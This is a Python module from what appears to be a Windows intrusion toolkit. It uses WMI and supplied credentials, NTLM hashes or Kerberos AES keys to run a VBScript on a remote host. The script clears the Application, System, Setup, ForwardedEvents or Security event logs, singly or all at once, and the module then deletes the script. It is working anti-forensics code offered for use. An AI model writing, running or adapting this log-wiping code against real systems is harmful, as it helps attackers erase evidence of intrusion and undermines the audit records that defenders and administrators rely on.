from module import *
from module import wmiconnect
from module import vbsrun
from module import checkError
import time
import os
import uuid
from io import StringIO

def clear(ip='', username='', password='',domain='',hashes='',aesKey='',logname='',id=''):
    lognamelist=["application","system","setup","forwardedevents","security"]
    if logname.lower()=="all":
        for log_ in lognamelist:
            clear(ip, username, password, domain, hashes, aesKey,log_)
        return 0
    if logname.lower() in lognamelist:
        logname=logname
    else:
        print("[-] Not Found LogName:{}".format(logname))
        return 1
    print("[*] clear eventlog:{}".format(logname))
    print("Sleep 10s.....")
    temp=open(os.path.join(os.getcwd(), "vbs", "clearEventLog.vbs"),"r",encoding="utf-8").read().replace("AAAAAAAAAAAAAAAAAAAAAAAAAAA",logname)
    open(os.path.join(os.getcwd(), "output", "clearEventLog.vbs"),"w").write(temp)
    vbspath = os.path.join(os.getcwd(), "output", "clearEventLog.vbs")
    if id==None:
        vbsrun.run_vbs(ip, username, password, domain, hashes, aesKey, vbspath)
        time.sleep(10)
        vbsrun.delete(ip, username, password, domain, hashes, aesKey, "Example")
    else:
        uid = str(uuid.uuid1())
        print("[*] the run vbs to uuid:{}".format(uid))
        print("To stop use --stop_vbs_id <uuid>")
        vbsrun.run_vbs(ip, username, password, domain, hashes, aesKey, vbspath,vbsid=uid)
        time.sleep(3)
